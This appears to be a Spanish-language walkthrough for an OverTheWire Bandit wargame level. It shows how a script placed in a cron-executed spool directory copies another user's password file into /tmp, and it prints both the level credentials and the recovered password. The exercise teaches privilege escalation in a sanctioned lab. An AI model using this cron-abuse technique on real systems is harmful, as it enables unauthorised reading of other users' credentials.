## Objetivo
A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
## Datos de acceso al nivel
**Usuario:** bandit23
**Contraseña:** QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
**Servidor:** bandit.labs.overthewire.org
```
ssh bandit@bandit.labs.overthewire.org -p 2220
```
## Solución
#! /bin/bash 
cat /etc/bandit_pass/bandit24 > /tmp/temporals/password.txt


```
bandit23@bandit:~$ cd /etc/cron.d
bandit23@bandit:/etc/cron.d$ mkdir /tmp/temporals
Unable to create directory /home/bandit23/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

bandit23@bandit:/tmp/temporals$ ls
script.sh
bandit23@bandit:/tmp/temporals$ chmod +x script.sh
bandit23@bandit:/tmp/temporals$ ls -la
total 408
drwxrwxr-x    2 bandit23 bandit23   4096 Feb 28 02:28 .
drwxrwx-wt 1731 root     root     405504 Feb 28 02:29 ..
-rwxrwxr-x    1 bandit23 bandit23     74 Feb 28 02:28 script.sh
bandit23@bandit:/tmp/temporals$ chmod 777 .
bandit23@bandit:/tmp/temporals$ cp script.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/temporals$ ls
password.txt  script.sh
bandit23@bandit:/tmp/temporals$ cat password.txt
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar

```
## Notas adicionales
Con nano se pueden crear archivos y escribir en ellos.
## Referencias
